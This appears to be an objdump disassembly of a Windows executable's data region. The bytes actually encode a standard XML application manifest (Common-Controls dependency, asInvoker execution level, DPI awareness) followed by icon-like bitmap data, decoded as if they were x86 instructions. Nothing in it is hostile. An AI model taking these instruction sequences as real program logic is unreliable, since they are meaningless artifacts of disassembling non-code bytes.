  40a37e:	and    BYTE PTR [esi+0x61],ch
  40a381:	ins    DWORD PTR es:[edi],dx
  40a382:	gs cmp eax,0x63694d22
  40a388:	jb     0x40a3f9
  40a38a:	jae    0x40a3fb
  40a38c:	data16 je 0x40a3bd
  40a38f:	push   edi
  40a390:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40a397:	inc    ebx
  40a398:	outs   dx,DWORD PTR ds:[esi]
  40a399:	ins    DWORD PTR es:[edi],dx
  40a39a:	ins    DWORD PTR es:[edi],dx
  40a39b:	outs   dx,DWORD PTR ds:[esi]
  40a39c:	outs   dx,BYTE PTR ds:[esi]
  40a39d:	sub    eax,0x746e6f43
  40a3a2:	jb     0x40a413
  40a3a4:	ins    BYTE PTR es:[edi],dx
  40a3a5:	jae    0x40a3c9
  40a3a7:	or     eax,0x2020200a
  40a3ac:	and    BYTE PTR [eax],ah
  40a3ae:	and    BYTE PTR [eax],ah
  40a3b0:	and    BYTE PTR [eax],ah
  40a3b2:	and    BYTE PTR [eax],ah
  40a3b4:	and    BYTE PTR [esi+0x65],dh
  40a3b7:	jb     0x40a42c
  40a3b9:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  40a3c0:	xor    BYTE PTR [esi],ch
  40a3c2:	xor    BYTE PTR [esi],ch
  40a3c4:	xor    BYTE PTR [edx],ah
  40a3c6:	or     eax,0x2020200a
  40a3cb:	and    BYTE PTR [eax],ah
  40a3cd:	and    BYTE PTR [eax],ah
  40a3cf:	and    BYTE PTR [eax],ah
  40a3d1:	and    BYTE PTR [eax],ah
  40a3d3:	and    BYTE PTR [eax+0x72],dh
  40a3d6:	outs   dx,DWORD PTR ds:[esi]
  40a3d7:	arpl   WORD PTR [ebp+0x73],sp
  40a3da:	jae    0x40a44b
  40a3dc:	jb     0x40a41f
  40a3de:	jb     0x40a443
  40a3e0:	push   0x63657469
  40a3e5:	je     0x40a45c
  40a3e7:	jb     0x40a44e
  40a3e9:	cmp    eax,0xd222a22
  40a3ee:	or     ah,BYTE PTR [eax]
  40a3f0:	and    BYTE PTR [eax],ah
  40a3f2:	and    BYTE PTR [eax],ah
  40a3f4:	and    BYTE PTR [eax],ah
  40a3f6:	and    BYTE PTR [eax],ah
  40a3f8:	and    BYTE PTR [eax],ah
  40a3fa:	and    BYTE PTR [eax+0x75],dh
  40a3fd:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40a401:	dec    ebx
  40a402:	gs jns 0x40a459
  40a405:	outs   dx,DWORD PTR ds:[esi]
  40a406:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40a40a:	and    dh,BYTE PTR [esi]
  40a40c:	xor    eax,0x36623539
  40a411:	xor    al,0x31
  40a413:	xor    al,0x34
  40a415:	arpl   WORD PTR [ebx+0x66],sp
  40a418:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  40a41c:	or     eax,0x2020200a
  40a421:	and    BYTE PTR [eax],ah
  40a423:	and    BYTE PTR [eax],ah
  40a425:	and    BYTE PTR [eax],ah
  40a427:	and    BYTE PTR [eax],ah
  40a429:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  40a42d:	addr16 jne 0x40a491
  40a430:	addr16 gs cmp eax,0xd222a22
  40a437:	or     ah,BYTE PTR [eax]
  40a439:	and    BYTE PTR [eax],ah
  40a43b:	and    BYTE PTR [eax],ah
  40a43d:	and    BYTE PTR [eax],ah
  40a43f:	and    BYTE PTR [edi],ch
  40a441:	ds or  eax,0x2020200a
  40a447:	and    BYTE PTR [edi+ebp*1],bh
  40a44a:	fs gs jo 0x40a4b3
  40a44e:	outs   dx,BYTE PTR ds:[esi]
  40a44f:	fs outs dx,BYTE PTR gs:[esi]
  40a452:	je     0x40a495
  40a454:	jae    0x40a4c9
  40a456:	gs ins DWORD PTR es:[edi],dx
  40a458:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a45c:	or     eax,0x642f3c0a
  40a461:	gs jo  0x40a4c9
  40a464:	outs   dx,BYTE PTR ds:[esi]
  40a465:	fs outs dx,BYTE PTR gs:[esi]
  40a468:	arpl   WORD PTR [ecx+0x3e],di
  40a46b:	or     eax,0x72743c0a
  40a470:	jne    0x40a4e5
  40a472:	je     0x40a4bd
  40a474:	outs   dx,BYTE PTR ds:[esi]
  40a475:	outs   dx,WORD PTR ds:[esi]
  40a477:	and    BYTE PTR [eax+0x6d],bh
  40a47a:	ins    BYTE PTR es:[edi],dx
  40a47b:	outs   dx,BYTE PTR ds:[esi]
  40a47c:	jae    0x40a4bb
  40a47e:	and    dh,BYTE PTR [ebp+0x72]
  40a481:	outs   dx,BYTE PTR ds:[esi]
  40a482:	cmp    dh,BYTE PTR [ebx+0x63]
  40a485:	push   0x73616d65
  40a48a:	sub    eax,0x7263696d
  40a48f:	outs   dx,DWORD PTR ds:[esi]
  40a490:	jae    0x40a501
  40a492:	data16 je 0x40a4c2
  40a495:	arpl   WORD PTR [edi+0x6d],bp
  40a498:	cmp    ah,BYTE PTR [ecx+0x73]
  40a49b:	ins    DWORD PTR es:[edi],dx
  40a49c:	cs jbe 0x40a4d2
  40a49f:	and    bh,BYTE PTR [esi]
  40a4a1:	or     eax,0x2020200a
  40a4a6:	and    BYTE PTR [ebx+esi*2],bh
  40a4a9:	arpl   WORD PTR gs:[ebp+0x72],si
  40a4ad:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40a4b5:	and    BYTE PTR [eax],ah
  40a4b7:	and    BYTE PTR [eax],ah
  40a4b9:	and    BYTE PTR [eax],ah
  40a4bb:	cmp    al,0x72
  40a4bd:	gs jno 0x40a535
  40a4c0:	gs jae 0x40a537
  40a4c3:	gs fs push eax
  40a4c6:	jb     0x40a531
  40a4c8:	jbe    0x40a533
  40a4ca:	ins    BYTE PTR es:[edi],dx
  40a4cb:	gs addr16 gs jae 0x40a50e
  40a4d0:	or     eax,0x2020200a
  40a4d5:	and    BYTE PTR [eax],ah
  40a4d7:	and    BYTE PTR [eax],ah
  40a4d9:	and    BYTE PTR [eax],ah
  40a4db:	and    BYTE PTR [eax],ah
  40a4dd:	and    BYTE PTR [edx+esi*2],bh
  40a4e0:	gs jno 0x40a558
  40a4e3:	gs jae 0x40a55a
  40a4e6:	gs fs inc ebp
  40a4e9:	js     0x40a550
  40a4eb:	arpl   WORD PTR [ebp+0x74],si
  40a4ee:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40a4f5:	ins    BYTE PTR es:[edi],dx
  40a4f6:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40a4fa:	gs ins BYTE PTR es:[edi],dx
  40a4fc:	cmp    eax,0x49736122
  40a501:	outs   dx,BYTE PTR ds:[esi]
  40a502:	jbe    0x40a573
  40a504:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40a508:	and    BYTE PTR [ebp+0x69],dh
  40a50b:	inc    ecx
  40a50c:	arpl   WORD PTR [ebx+0x65],sp
  40a50f:	jae    0x40a584
  40a511:	cmp    eax,0x6c616622
  40a516:	jae    0x40a57d
  40a518:	and    ch,BYTE PTR [edi]
  40a51a:	ds or  eax,0x2020200a
  40a520:	and    BYTE PTR [eax],ah
  40a522:	and    BYTE PTR [eax],ah
  40a524:	and    BYTE PTR [edi+ebp*1],bh
  40a527:	jb     0x40a58e
  40a529:	jno    0x40a5a0
  40a52b:	gs jae 0x40a5a2
  40a52e:	gs fs push eax
  40a531:	jb     0x40a59c
  40a533:	jbe    0x40a59e
  40a535:	ins    BYTE PTR es:[edi],dx
  40a536:	gs addr16 gs jae 0x40a579
  40a53b:	or     eax,0x2020200a
  40a540:	and    BYTE PTR [edi+ebp*1],bh
  40a543:	jae    0x40a5aa
  40a545:	arpl   WORD PTR [ebp+0x72],si
  40a548:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  40a550:	je     0x40a5c4
  40a552:	jne    0x40a5c7
  40a554:	je     0x40a59f
  40a556:	outs   dx,BYTE PTR ds:[esi]
  40a557:	outs   dx,WORD PTR ds:[esi]
  40a559:	ds or  eax,0x70613c0a
  40a55f:	jo     0x40a5cd
  40a561:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a568:	and    BYTE PTR [eax+0x6d],bh
  40a56b:	ins    BYTE PTR es:[edi],dx
  40a56c:	outs   dx,BYTE PTR ds:[esi]
  40a56d:	jae    0x40a5ac
  40a56f:	and    dh,BYTE PTR [ebp+0x72]
  40a572:	outs   dx,BYTE PTR ds:[esi]
  40a573:	cmp    dh,BYTE PTR [ebx+0x63]
  40a576:	push   0x73616d65
  40a57b:	sub    eax,0x7263696d
  40a580:	outs   dx,DWORD PTR ds:[esi]
  40a581:	jae    0x40a5f2
  40a583:	data16 je 0x40a5b3
  40a586:	arpl   WORD PTR [edi+0x6d],bp
  40a589:	cmp    ah,BYTE PTR [ecx+0x73]
  40a58c:	ins    DWORD PTR es:[edi],dx
  40a58d:	cs jbe 0x40a5c3
  40a590:	and    bh,BYTE PTR [esi]
  40a592:	or     eax,0x2020200a
  40a597:	and    BYTE PTR [edi+esi*2],bh
  40a59a:	imul   ebp,DWORD PTR [esi+0x64],0x5373776f
  40a5a1:	gs je  0x40a618
  40a5a4:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  40a5ab:	and    BYTE PTR [eax],ah
  40a5ad:	and    BYTE PTR [eax],ah
  40a5af:	and    BYTE PTR [eax],ah
  40a5b1:	and    BYTE PTR [eax],ah
  40a5b3:	cmp    al,0x64
  40a5b5:	jo     0x40a620
  40a5b7:	inc    ecx
  40a5b8:	ja     0x40a61b
  40a5ba:	jb     0x40a621
  40a5bc:	and    BYTE PTR [eax],ah
  40a5be:	js     0x40a62d
  40a5c0:	ins    BYTE PTR es:[edi],dx
  40a5c1:	outs   dx,BYTE PTR ds:[esi]
  40a5c2:	jae    0x40a601
  40a5c4:	and    ch,BYTE PTR [eax+0x74]
  40a5c7:	je     0x40a639
  40a5c9:	cmp    ch,BYTE PTR [edi]
  40a5cb:	das    
  40a5cc:	jae    0x40a631
  40a5ce:	push   0x73616d65
  40a5d3:	cs ins DWORD PTR es:[edi],dx
  40a5d5:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a5dc:	je     0x40a60c
  40a5de:	arpl   WORD PTR [edi+0x6d],bp
  40a5e1:	das    
  40a5e2:	push   ebx
  40a5e3:	dec    ebp
  40a5e4:	dec    ecx
  40a5e5:	das    
  40a5e6:	xor    dh,BYTE PTR [eax]
  40a5e8:	xor    BYTE PTR ds:0x6e69572f,dh
  40a5ee:	outs   dx,DWORD PTR fs:[esi]
  40a5f0:	ja     0x40a665
  40a5f2:	push   ebx
  40a5f3:	gs je  0x40a66a
  40a5f6:	imul   ebp,DWORD PTR [esi+0x67],0x743e2273
  40a5fd:	jb     0x40a674
  40a5ff:	gs cmp al,0x2f
  40a602:	fs jo  0x40a66e
  40a605:	inc    ecx
  40a606:	ja     0x40a669
  40a608:	jb     0x40a66f
  40a60a:	ds or  eax,0x2020200a
  40a610:	and    BYTE PTR [edi+ebp*1],bh
  40a613:	ja     0x40a67e
  40a615:	outs   dx,BYTE PTR ds:[esi]
  40a616:	outs   dx,DWORD PTR fs:[esi]
  40a618:	ja     0x40a68d
  40a61a:	push   ebx
  40a61b:	gs je  0x40a692
  40a61e:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  40a625:	cmp    al,0x2f
  40a627:	popa   
  40a628:	jo     0x40a69a
  40a62a:	ins    BYTE PTR es:[edi],dx
  40a62b:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a632:	ds or  eax,0x612f3c0a
  40a638:	jae    0x40a6ad
  40a63a:	gs ins DWORD PTR es:[edi],dx
  40a63c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a640:	or     eax,0xa
  40a645:	add    BYTE PTR [eax],al
  40a647:	add    BYTE PTR [eax],ch
  40a649:	add    BYTE PTR [eax],al
  40a64b:	add    BYTE PTR [eax],ah
  40a64d:	add    BYTE PTR [eax],al
  40a64f:	add    BYTE PTR [eax+0x0],al
  40a652:	add    BYTE PTR [eax],al
  40a654:	add    DWORD PTR [eax],eax
  40a656:	add    DWORD PTR [eax],eax
  40a658:	add    BYTE PTR [eax],al
  40a65a:	add    BYTE PTR [eax],al
  40a65c:	add    BYTE PTR [ecx],al
	...
  40a672:	add    BYTE PTR [eax],al
  40a674:	(bad)  
  40a675:	(bad)  
  40a676:	inc    DWORD PTR [eax]
	...
  40a680:	aas    
  40a681:	(bad)  
  40a682:	inc    BYTE PTR [eax]
  40a684:	xor    cl,al
  40a686:	xchg   BYTE PTR [eax],al
  40a688:	aas    
  40a689:	(bad)  
  40a68a:	inc    BYTE PTR [eax]
  40a68c:	xor    bh,ah
  40a68e:	xchg   BYTE PTR [eax],al
  40a690:	cmp    cl,bl
  40a692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a693:	add    BYTE PTR [ecx+eax*8],bh
  40a696:	mov    es,WORD PTR [eax]
  40a698:	aas    
  40a699:	(bad)  
  40a69a:	(bad)  
  40a69b:	cld    
  40a69c:	xor    cl,al
  40a69e:	xchg   BYTE PTR [edi+edi*1+0x38fcfeff],al
  40a6a5:	jecxz  0x40a6ad
  40a6a7:	test   BYTE PTR [eax],dh
  40a6a9:	ret    
  40a6aa:	push   esi
  40a6ab:	cld    
  40a6ac:	cmp    ch,bl
  40a6ae:	scas   al,BYTE PTR es:[edi]
  40a6af:	test   BYTE PTR [eax],bh
  40a6b1:	jecxz  0x40a641
  40a6b3:	cld    
  40a6b4:	aas    
  40a6b5:	(bad)  
  40a6b6:	inc    BYTE PTR [eax+eax*1+0x3ffc0000]
  40a6bd:	(bad)  
  40a6be:	inc    BYTE PTR [eax+eax*1+0xfc0000]
  40a6c5:	add    bh,bh
  40a6c7:	test   BYTE PTR [eax],al
  40a6c9:	add    bh,bh
  40a6cb:	cld    
  40a6cc:	add    BYTE PTR [eax],al
  40a6ce:	add    BYTE PTR [eax],al
  40a6d0:	add    al,al
  40a6d2:	(bad)  
  40a6d3:	cld    
  40a6d4:	add    DWORD PTR [eax],ebp
  40a6d6:	add    BYTE PTR [eax],al
  40a6d8:	add    DWORD PTR [eax],eax
  40a6da:	add    BYTE PTR [eax],al
  40a6dc:	add    DWORD PTR [eax],ebp
  40a6de:	add    BYTE PTR [eax],al
  40a6e0:	add    al,al
	...
  40a6ea:	add    BYTE PTR [eax],al
  40a6ec:	add    edi,edi
  40a6ee:	inc    eax
	...
  40a6f8:	(bad)  
  40a6f9:	(bad)  
  40a6fa:	(bad)  
  40a6fb:	inc    DWORD PTR [eax-0x7f010000]
  40a701:	add    BYTE PTR [eax],al
  40a703:	inc    DWORD PTR [eax-0x7f010000]
  40a709:	add    BYTE PTR [eax],al
  40a70b:	inc    DWORD PTR [eax-0x7f010000]
  40a711:	add    BYTE PTR [eax],al
  40a713:	inc    DWORD PTR [eax-0x7fff0000]
  40a719:	add    BYTE PTR [eax],al
  40a71b:	add    DWORD PTR [eax-0x7fff0000],eax
  40a721:	add    BYTE PTR [eax],al
  40a723:	add    DWORD PTR [eax-0x7fff0000],eax
  40a729:	add    BYTE PTR [eax],al
  40a72b:	add    DWORD PTR [eax-0x7fff0000],eax
  40a731:	add    BYTE PTR [eax],al
  40a733:	add    DWORD PTR [eax-0x7fff0000],eax
  40a739:	add    BYTE PTR [eax],al
  40a73b:	add    DWORD PTR [eax-0x7fff0000],eax
  40a741:	add    BYTE PTR [eax],al
  40a743:	add    eax,edi
  40a745:	add    BYTE PTR [eax],al
  40a747:	add    eax,edi
  40a749:	add    BYTE PTR [eax],al
  40a74b:	add    eax,edi
  40a74d:	add    BYTE PTR [eax],al
  40a74f:	add    eax,edi
  40a751:	add    BYTE PTR [eax],al
  40a753:	add    eax,edi
  40a755:	add    BYTE PTR [eax],al
  40a757:	add    eax,edi
  40a759:	add    BYTE PTR [eax],al
  40a75b:	pop    ds
  40a75c:	clc    
  40a75d:	add    BYTE PTR [eax],al
  40a75f:	pop    ds
  40a760:	clc    
  40a761:	add    BYTE PTR [eax],al
  40a763:	pop    ds
  40a764:	clc    
  40a765:	add    BYTE PTR [eax],al
  40a767:	pop    ds
  40a768:	clc    
  40a769:	add    BYTE PTR [eax],al
  40a76b:	pop    ds
  40a76c:	clc    
  40a76d:	add    BYTE PTR [eax],al
  40a76f:	pop    ds
  40a770:	clc    
  40a771:	add    BYTE PTR [eax],al
  40a773:	pop    ds
  40a774:	(bad)  
  40a775:	(bad)  
  40a776:	(bad)  
  40a777:	jmp    FWORD PTR [eax]
  40a779:	add    BYTE PTR [eax],al
  40a77b:	add    BYTE PTR [eax],ah
  40a77d:	add    BYTE PTR [eax],al
  40a77f:	add    BYTE PTR [eax+0x0],al
  40a782:	add    BYTE PTR [eax],al
  40a784:	add    DWORD PTR [eax],eax
  40a786:	add    al,0x0
  40a788:	add    BYTE PTR [eax],al
  40a78a:	add    BYTE PTR [eax],al
  40a78c:	add    BYTE PTR [edx],0x0
	...
  40a7a3:	add    BYTE PTR [eax],al
  40a7a5:	add    BYTE PTR [eax+0x800000],al
  40a7ab:	add    BYTE PTR [eax],al
  40a7ad:	add    BYTE PTR [eax+0x8000],0x0
  40a7b4:	add    BYTE PTR [eax],0x80
  40a7b7:	add    BYTE PTR [eax-0x7fffff80],al
  40a7bd:	add    BYTE PTR [eax-0x3f3f4000],0x0
  40a7c4:	add    BYTE PTR [eax],al
  40a7c6:	inc    DWORD PTR [eax]
  40a7c8:	add    bh,bh
  40a7ca:	add    BYTE PTR [eax],al
  40a7cc:	add    bh,bh
  40a7ce:	inc    DWORD PTR [eax]
  40a7d0:	inc    DWORD PTR [eax]
  40a7d2:	add    BYTE PTR [eax],al
  40a7d4:	inc    DWORD PTR [eax]
  40a7d6:	inc    DWORD PTR [eax]
  40a7d8:	(bad)  
  40a7d9:	inc    DWORD PTR [eax]
  40a7db:	add    bh,bh
  40a7dd:	(bad)  
  40a7de:	inc    DWORD PTR [eax]
	...
  40a7f0:	pop    es
  40a7f1:	ja     0x40a86a
  40a7f3:	ja     0x40a86c
  40a7f5:	ja     0x40a86e
  40a7f7:	ja     0x40a870
  40a7f9:	ja     0x40a872
  40a7fb:	ja     0x40a7fd
	...
  40a809:	add    BYTE PTR [eax],al
  40a80b:	pop    es
  40a80c:	add    BYTE PTR [eax],al
  40a80e:	add    BYTE PTR [eax],al
  40a810:	ud0    edi,edi
  40a813:	(bad)  
  40a814:	(bad)  
  40a815:	(bad)  
  40a816:	(bad)  
  40a817:	(bad)  
  40a818:	(bad)  
  40a819:	(bad)  
  40a81a:	inc    DWORD PTR [edi]
  40a81c:	add    BYTE PTR [eax],al
  40a81e:	add    BYTE PTR [eax],al
  40a820:	(bad)  
  40a822:	add    BYTE PTR [edi],cl
  40a824:	lock add BYTE PTR [eax],al
  40a827:	inc    DWORD PTR [eax]
  40a829:	add    bh,bh
  40a82b:	pop    es
  40a82c:	add    BYTE PTR [eax],al
  40a82e:	add    BYTE PTR [eax],al
  40a830:	ud0    edi,edi
  40a833:	(bad)  
  40a834:	(bad)  
  40a835:	(bad)  
  40a836:	(bad)  
  40a837:	(bad)  
  40a838:	(bad)  
  40a839:	(bad)  
  40a83a:	inc    DWORD PTR [edi]
  40a83c:	add    BYTE PTR [eax],al
  40a83e:	add    BYTE PTR [eax],al
  40a840:	pmaddwd mm2,QWORD PTR [ebp+0xf]
  40a844:	inc    DWORD PTR [eax]
  40a846:	(bad)  
  40a847:	inc    DWORD PTR [eax]
  40a849:	add    bh,bh
  40a84b:	pop    es
  40a84c:	add    BYTE PTR [eax],al
  40a84e:	add    BYTE PTR [eax],al
  40a850:	ud0    ecx,DWORD PTR [edi]
  40a853:	pop    edi
  40a854:	lock or ecx,DWORD PTR [edi]
  40a857:	dec    DWORD PTR [esi]
  40a859:	sar    bh,0x7
  40a85c:	ja     0x40a8d5
  40a85e:	ja     0x40a8d0
  40a860:	ud0    esi,ebp
  40a863:	(bad)  
  40a865:	add    BYTE PTR [eax],al
  40a867:	inc    DWORD PTR [eax]
  40a869:	add    bh,bh
  40a86b:	add    BYTE PTR [eax],al
  40a86d:	add    BYTE PTR [eax],al
  40a86f:	jo     0x40a880
  40a871:	(bad)  
  40a872:	(bad)  
  40a873:	(bad)  
  40a874:	(bad)  
  40a875:	(bad)  
  40a876:	(bad)  
  40a877:	(bad)  
  40a878:	(bad)  
  40a879:	(bad)  
  40a87a:	dec    DWORD PTR [eax]
  40a87c:	(bad)  
  40a87d:	push   eax
  40a87f:	jo     0x40a890
  40a881:	lock add BYTE PTR [edi],cl
  40a884:	lock add BYTE PTR [eax],al
  40a887:	inc    DWORD PTR [eax]
  40a889:	add    bh,bh
  40a88b:	or     BYTE PTR [eax],al
  40a88d:	add    al,dh
  40a88f:	jo     0x40a8a0
  40a891:	(bad)  
  40a892:	(bad)  
  40a893:	(bad)  
  40a894:	(bad)  
  40a895:	(bad)  
  40a896:	(bad)  
  40a897:	(bad)  
  40a898:	(bad)  
  40a899:	(bad)  
  40a89a:	dec    DWORD PTR [eax]
  40a89c:	(bad)  
  40a89d:	push   eax
  40a89f:	jo     0x40a8b0
  40a8a1:	test   DWORD PTR [eax],0xf00ff0f
  40a8a7:	lock add BYTE PTR [eax],al
  40a8aa:	dec    DWORD PTR [eax]
  40a8ac:	add    BYTE PTR [eax],al
  40a8ae:	lock jo 0x40a8c0
  40a8b1:	lock add BYTE PTR [edi],cl
  40a8b4:	lock add BYTE PTR [edi],cl
  40a8b7:	lock ja 0x40a8ba
  40a8ba:	dec    DWORD PTR [eax]
  40a8bc:	(bad)  
  40a8bd:	push   eax
  40a8bf:	jo     0x40a8d0
  40a8c1:	dec    DWORD PTR [edi]
  40a8c3:	ud0    eax,DWORD PTR [esi]
  40a8c6:	ud0    edi,DWORD PTR [edi+ecx*1-0x1]
  40a8cb:	or     BYTE PTR [eax],al
  40a8cd:	add    al,dh
  40a8cf:	jo     0x40a8e0
  40a8d1:	inc    DWORD PTR [eax]
  40a8d3:	ud0    eax,DWORD PTR [eax]
  40a8d6:	ud0    esi,DWORD PTR [edi+0xf]
  40a8da:	dec    DWORD PTR [eax]
  40a8dc:	(bad)  
  40a8dd:	push   eax
  40a8df:	jo     0x40a8f0
  40a8e1:	(bad)  
  40a8e2:	(bad)  
  40a8e3:	(bad)  
  40a8e4:	(bad)  
  40a8e5:	(bad)  
  40a8e6:	(bad)  
  40a8e7:	(bad)  
  40a8e8:	(bad)  
  40a8e9:	(bad)  
  40a8ea:	dec    DWORD PTR [eax]
  40a8ec:	add    BYTE PTR [eax],al
  40a8ee:	lock jo 0x40a8f1
	...
  40a8f9:	add    BYTE PTR [eax],al
  40a8fb:	or     bh,bh
  40a8fd:	push   eax
  40a8ff:	jo     0x40a90f
  40a901:	out    dx,al
  40a902:	out    dx,al
  40a903:	out    dx,al
  40a904:	out    dx,al
  40a905:	out    dx,al
  40a906:	out    dx,al
  40a907:	out    dx,al
  40a908:	out    dx,al
  40a909:	out    dx,al
  40a90a:	out    dx,al
  40a90b:	or     BYTE PTR [eax],al
  40a90d:	add    al,dh
  40a90f:	jo     0x40a911
	...
  40a919:	add    BYTE PTR [eax],al
  40a91b:	ud0    edi,edi
  40a91e:	lock jo 0x40a921
  40a921:	add    BYTE PTR [esp+eax*8],al
  40a924:	(bad)  
  40a925:	(bad)  
  40a926:	les    ecx,FWORD PTR [edi]
  40a928:	(bad)  
  40a929:	(bad)  
  40a92a:	(bad)  
  40a92b:	inc    DWORD PTR [eax]
  40a92d:	add    al,dh
  40a92f:	jo     0x40a931
  40a931:	add    BYTE PTR [esp+ecx*2],cl
  40a934:	dec    esp
  40a935:	dec    esp
  40a936:	dec    esp
  40a937:	ud0    edi,edi
  40a93a:	(bad)  
  40a93b:	(bad)  
  40a93c:	(bad)  
  40a93d:	push   eax
  40a93f:	jo     0x40a941
  40a941:	add    BYTE PTR [esp+eax*8],al
  40a944:	(bad)  
  40a945:	(bad)  
  40a946:	les    eax,FWORD PTR [eax]
  40a948:	add    BYTE PTR [eax],al
  40a94a:	add    BYTE PTR [eax],al
  40a94c:	add    BYTE PTR [eax],al
  40a94e:	add    BYTE PTR [eax+0x0],dh
  40a951:	add    BYTE PTR [edi+ecx*2],cl
  40a954:	cld    
  40a955:	dec    esp
  40a956:	dec    esp
  40a957:	push   cs
  40a958:	out    dx,al
  40a959:	out    dx,al
  40a95a:	out    dx,al
  40a95b:	out    dx,al
  40a95c:	out    dx,al
  40a95d:	out    dx,al
  40a95e:	loopne 0x40a960
  40a960:	add    BYTE PTR [eax],al
  40a962:	add    al,0xf4
  40a964:	iret   
  40a965:	iret   
  40a966:	les    eax,FWORD PTR [eax]
	...
  40a970:	add    BYTE PTR [eax],al
  40a972:	or     al,0xfc
  40a974:	dec    esp
  40a975:	dec    esp
  40a976:	dec    esp
  40a977:	dec    esp
  40a978:	dec    esp
  40a979:	dec    esp
  40a97a:	dec    esp
  40a97b:	dec    esp
  40a97c:	inc    eax
  40a97d:	jo     0x40a97f
  40a97f:	add    BYTE PTR [eax],al
  40a981:	add    BYTE PTR [esp+esi*8],al
  40a984:	iret   
  40a985:	iret   
  40a986:	(bad)  
  40a987:	(bad)  
  40a988:	(bad)  
  40a989:	(bad)  
  40a98a:	(bad)  
  40a98b:	(bad)  
  40a98c:	shl    BYTE PTR [eax+0x0],0x0
  40a990:	add    BYTE PTR [eax],al
  40a992:	or     al,0x4f
  40a994:	cld    
  40a995:	dec    esp
  40a996:	dec    esp
  40a997:	dec    esp
  40a998:	dec    esp
  40a999:	dec    esp
  40a99a:	dec    esp
  40a99b:	dec    esp
  40a99c:	inc    eax
  40a99d:	jo     0x40a99f
  40a99f:	add    BYTE PTR [eax],al
  40a9a1:	add    BYTE PTR [esp+eax*8],al
  40a9a4:	(bad)  
  40a9a5:	(bad)  
  40a9a6:	(bad)  
  40a9a7:	(bad)  
  40a9a8:	(bad)  
  40a9a9:	(bad)  
  40a9aa:	(bad)  
  40a9ab:	(bad)  
  40a9ac:	shl    BYTE PTR [eax+0x0],0x0
	...
  40a9bc:	add    BYTE PTR [eax+0x0],dh
  40a9bf:	add    BYTE PTR [eax],al
  40a9c1:	add    BYTE PTR [esi],cl
  40a9c3:	out    dx,al
  40a9c4:	out    dx,al
  40a9c5:	out    dx,al
  40a9c6:	out    dx,al
  40a9c7:	out    dx,al
  40a9c8:	out    dx,al
  40a9c9:	out    dx,al
  40a9ca:	out    dx,al
  40a9cb:	out    dx,al
  40a9cc:	loopne 0x40aa3e
	...
  40a9de:	add    BYTE PTR [eax],al
  40a9e0:	(bad)  
  40a9e1:	(bad)  
  40a9e2:	(bad)  
  40a9e3:	inc    DWORD PTR [eax+0xff0000]
  40a9e9:	add    BYTE PTR [eax],al
  40a9eb:	inc    DWORD PTR [eax]
  40a9ed:	add    BYTE PTR [eax],al
  40a9ef:	inc    DWORD PTR [eax]
  40a9f1:	add    BYTE PTR [eax],al
  40a9f3:	inc    DWORD PTR [eax]
  40a9f5:	add    BYTE PTR [eax],al
  40a9f7:	inc    DWORD PTR [eax]
  40a9f9:	add    BYTE PTR [eax],al
  40a9fb:	inc    DWORD PTR [eax]
  40a9fd:	add    BYTE PTR [eax],al
  40a9ff:	add    DWORD PTR [eax],eax
  40aa01:	add    BYTE PTR [eax],al
  40aa03:	add    DWORD PTR [eax],eax
  40aa05:	add    BYTE PTR [eax],al
  40aa07:	add    DWORD PTR [eax],eax
  40aa09:	add    BYTE PTR [eax],al
  40aa0b:	add    DWORD PTR [eax],eax
  40aa0d:	add    BYTE PTR [eax],al
  40aa0f:	add    DWORD PTR [eax],eax
  40aa11:	add    BYTE PTR [eax],al
  40aa13:	add    DWORD PTR [eax],eax
  40aa15:	add    BYTE PTR [eax],al
  40aa17:	add    DWORD PTR [eax],eax
  40aa19:	add    BYTE PTR [eax],al
  40aa1b:	add    DWORD PTR [eax],eax
  40aa1d:	add    BYTE PTR [eax],al
  40aa1f:	add    DWORD PTR [eax],eax
  40aa21:	add    BYTE PTR [eax],al
  40aa23:	add    DWORD PTR [eax],eax
  40aa25:	add    BYTE PTR [eax],al
  40aa27:	add    DWORD PTR [eax],eax
  40aa29:	add    BYTE PTR [eax],al
  40aa2b:	add    DWORD PTR [eax],eax
  40aa2d:	add    BYTE PTR [eax],al
  40aa2f:	add    eax,esi
  40aa31:	add    BYTE PTR [eax],al
  40aa33:	add    eax,esi
  40aa35:	add    BYTE PTR [eax],al
  40aa37:	add    eax,esi
  40aa39:	add    BYTE PTR [eax],al
  40aa3b:	add    eax,esi
  40aa3d:	add    BYTE PTR [eax],al
  40aa3f:	add    esi,eax
  40aa41:	add    BYTE PTR [eax],al
  40aa43:	add    esi,eax
  40aa45:	add    BYTE PTR [eax],al
  40aa47:	pop    ds
  40aa48:	lock add BYTE PTR [eax],al
  40aa4b:	pop    ds
  40aa4c:	lock add BYTE PTR [eax],al
  40aa4f:	pop    ds
  40aa50:	lock add BYTE PTR [eax],al
  40aa53:	pop    ds
  40aa54:	lock add BYTE PTR [eax],al
  40aa57:	pop    ds
  40aa58:	lock add BYTE PTR [eax],al
  40aa5b:	pop    ds
  40aa5c:	lock add BYTE PTR [eax],al
  40aa5f:	aas    
  40aa60:	add    BYTE PTR [eax],al
  40aa62:	add    DWORD PTR [eax],eax
  40aa64:	add    al,BYTE PTR [eax]
  40aa66:	and    BYTE PTR [eax],ah
  40aa68:	add    al,BYTE PTR [eax]
  40aa6a:	add    DWORD PTR [eax],eax
  40aa6c:	add    DWORD PTR [eax],eax
  40aa6e:	xor    BYTE PTR [ecx],al
  40aa70:	add    BYTE PTR [eax],al
  40aa72:	add    DWORD PTR [eax],eax
